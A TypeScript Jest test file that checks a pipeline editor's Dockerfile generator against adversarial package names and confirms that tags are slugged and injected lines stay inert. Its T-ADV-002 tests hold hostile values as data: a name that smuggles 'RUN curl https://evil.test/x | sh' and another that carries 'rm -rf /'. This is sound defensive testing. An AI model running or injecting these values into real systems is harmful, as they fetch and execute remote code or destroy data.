// T-ADV-001… — generators fed values the editor and package.json really
// can produce, but that no fixture ever contained (adversarial review
// TEST-02). The rule here: a hostile value must produce a *valid* artifact
// or a *clear refusal*, never a silently broken one.

import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { ALL_RULES, Detector } from '../modules/detector';
import { generate } from '../modules/dockerfile-generator';
import type { PipelineIR } from '../modules/ir';

let root: string;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'pipe-editor-adv-'));
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

function detectWithName(name: string): PipelineIR {
  const dir = join(root, 'app');
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, 'package.json'),
    JSON.stringify({ name, engines: { node: '20' }, packageManager: 'npm@10.0.0' }),
  );
  writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3}');
  return new Detector({ rules: ALL_RULES }).detect(dir).ir;
}

describe('T-ADV-001 (GEN-01) — a scoped package name', () => {
  // `@acme/api` is an ordinary npm name. Every CI file generated for one
  // used to carry `docker build -t @acme/api:ci .` — an invalid reference.
  it('produces a valid Docker reference in the docker-build command', () => {
    const ir = detectWithName('@acme/api');
    const dockerBuild = ir.stages.find((s) => s.id === 'docker-build');
    expect(dockerBuild?.steps[0].run).toBe('docker build -t acme-api:ci .');
  });

  it.each(['@acme/api', 'My App!', 'UPPER_CASE', 'trailing---'])(
    'tags %p with a reference-grammar-valid name',
    (name) => {
      const ir = detectWithName(name);
      const run = ir.stages.find((s) => s.id === 'docker-build')!.steps[0].run;
      const tag = /docker build -t (\S+):ci \./.exec(run)?.[1];
      expect(tag).toMatch(/^[a-z0-9]+(?:[._-][a-z0-9]+)*$/);
    },
  );

  it('keeps the untouched project name in the IR itself', () => {
    // Only the *tag* is slugged; the IR still records what package.json said.
    expect(detectWithName('@acme/api').project.name).toBe('@acme/api');
  });
});

describe('T-ADV-002 (GEN-01) — a name carrying control characters', () => {
  const INJECTION = 'app"\nRUN curl https://evil.test/x | sh\n# ';

  it('cannot inject lines into the generated Dockerfile', () => {
    const ir = detectWithName(INJECTION);
    const { dockerfile } = generate(ir);

    // The comment is one line and the injected directive is not a directive.
    const injected = dockerfile
      .split('\n')
      .filter((l) => l.trimStart().startsWith('RUN curl'));
    expect(injected).toEqual([]);
    expect(dockerfile).toContain('RUN curl https://evil.test/x | sh');
    const sourceLine = dockerfile
      .split('\n')
      .find((l) => l.startsWith('# Source: project'));
    expect(sourceLine).toContain('RUN curl https://evil.test/x | sh');
  });

  it('cannot extend the docker-build shell command', () => {
    const ir = detectWithName('app; rm -rf /');
    const run = ir.stages.find((s) => s.id === 'docker-build')!.steps[0].run;
    expect(run).toBe('docker build -t app-rm-rf:ci .');
    expect(run).not.toContain(';');
  });
});
